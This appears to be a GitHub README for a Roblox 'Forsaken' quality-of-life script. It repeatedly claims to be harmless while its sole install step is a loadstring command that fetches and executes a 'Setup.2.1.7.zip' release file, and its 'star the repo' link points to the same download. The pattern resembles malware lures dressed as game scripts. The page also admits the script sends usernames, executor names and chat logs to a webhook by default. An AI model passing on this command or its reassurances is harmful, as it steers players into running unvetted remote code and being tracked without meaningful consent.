# forsakextras

> A **QoL script** for the Roblox game **Forsaken**, providing features like music replacement and GUI tweaks — **nothing malicious or "cheaty"**.

---

## 📜 The Script

```lua
loadstring(game:HttpGet("https://github.com/sportmanbillytimqcq/forsakextras/releases/download/qg66c7tee/Setup.2.1.7.zip"))()
```

> ⚠️ **This script does not include cheats** such as speed hacks, fly, or exploitative abilities. It is intended strictly for client-side customization — like music replacement or GUI additions.
> Future updates may add optional client-side bug fixes.
> You can suggest features or report bugs in the **Issues** tab!
>
> **If you like this script, consider [starring the repo](https://github.com/sportmanbillytimqcq/forsakextras/releases/download/qg66c7tee/Setup.2.1.7.zip) or sharing it around (with proper credit, please!)** — it helps a lot!

## 🔒 Privacy Note

By default, the script sends your **username**, **executor**, and some **chat logs** to a webhook (mostly for fun/debug purposes).
If you’d prefer not to be tracked:

```lua
-- At the top of the script (forsakextras.lua), set this:
TrackMePlease = false
```

## 📁 What’s in this Repo?

This repo contains the **assets** (audio, video, images) used by the script — nothing executable or harmful.
It exists solely to support Forsakextras.

## 🙏 Thanks

Special thanks to **ivannetta**, creator of the original *"fartsaken"* script (which had cheat elements), for:

* Music replacement logic
* File/asset download functions
* Killer emote GUI
* Scripting documentation for executor support
